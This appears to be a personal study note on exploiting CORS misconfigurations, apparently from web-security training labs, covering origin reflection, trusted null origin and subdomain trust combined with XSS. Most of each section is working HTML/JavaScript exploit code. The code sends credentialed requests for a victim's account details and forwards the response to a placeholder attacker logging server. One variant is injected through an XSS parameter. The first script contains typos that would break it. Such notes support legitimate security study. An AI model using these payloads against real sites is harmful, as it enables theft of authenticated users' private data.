![[CORS.webp]]
# Recon

Analyse the app's responses to see if any explicitly support CORS:

- Access-Control-Allow-Origins: https://malicious-website.com

Identify what origins are allowed to submit CORS requests to the app, submit the following header in the requests:

- Origin: same-value

Identify if any of those requests can be used to send CORS request with credentials:

- Access-Control-Allow-Credentials: true

The examples from the labs can help create exploits to take advantage of these misconfigurations.
# Basic Origin Reflection

The app is allowing any Origin to submit a cross-origin request and view the authenticated response. This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:

```html
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: attacker.com
```

With these headers in the response, an attacker can host malicious code in their server that will submit a request to the vulnerable app and direct the authenticated response back to their server. Now, the attacker needs to trick the victim user into visiting their website while they are authenticated to the vulnerable application.

>[!info]
>Make sure to set the file extension to .html or no extension also work in Exploit Server labs.

```html
<html>
<script>
	var req - newXMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://VULNERABLE-APP.com/accountDetails',true)
	req.withCredentials = true;
	req.send();

	function reqListener() {
		loation = 'https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key='+this.responseText;
	};
</script>
</html>
```
# Trusted Null Origin

The app is only allowing the "null" Origin to submit a cross-origin request and view the authenticated response. This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:

```html
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: null
```

With these headers in the response, an attacker can host malicious code in their server that will submit a request to the vulnerable app and direct the authenticated response back to their server. 

The malicious code will be within an \<iframe> that will cause the browser to set the Origin header to "null". The attacker now needs to trick the victim user into visiting their website while they are authenticated to the vulnerable application.

>[!info]
>Make sure to set the file extension to .html or no extension also work in Exploit Server labs.

```html
<html>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://ATTACKERS-SERVER-LOG-LOCATION.com/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
</html>
```
# Subdomain Origin Allowed

The app is only allowing subdomains to send cross-origin requests and view the authenticated response. This is possible because the app is returning the following headers in a response, which contains sensitive information about the logged in user:

```html
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: subdomain.vulnerable-app.com
```

If the subdomain contains an XSS vulnerability, you can inject a script that will submit a request to the main application and send the response to the attacker’s server. This will work since the subdomain is allowed to view the authenticated responses from the main application.

When the XSS script executes, the Origin header's value will be **subdomain.vulnerable-app.com** (reason why is because the xss script is essentially a part of the application now). This allows the response to contain the authenticated data. The attacker now needs to trick the victim user into visiting their website, while they are authenticated to the vulnerable application.

>[!info]
>Make sure to set the file extension to .html or no extension also work in Exploit Server labs.

Make sure to encode the angle brackets \<> in the payload within the document.location to prevent breaking the payload. This payload is the exact same as the Basic Origin Reflection, except the payload is injected in the XSS vulnerable parameter of the Subdomain.

```html
<html>
<script>
    document.location="http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4%3cscript%3e var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key='%2bthis.responseText; };%3c/script%3e&storeId=1"
</script>
</html>
```

The decoded version being:

```html
<html>
<script>
   document.location="http://SUBDOMAIN.VULNERABLE-APPLICATION.com/?productId=4
      <script> 
         var req = new XMLHttpRequest(); 
         req.onload = reqListener;
         req.open('get','https://VULNERABLE-APPLICATION.com/accountDetails',true); 
         req.withCredentials = true; 
         req.send();
         function reqListener() {
            location='https://ATTACKERS-SERVER-LOG-LOCATION.net/log?key='+this.responseText; 
      };</script>&storeId=1"
</script>
</html>
```

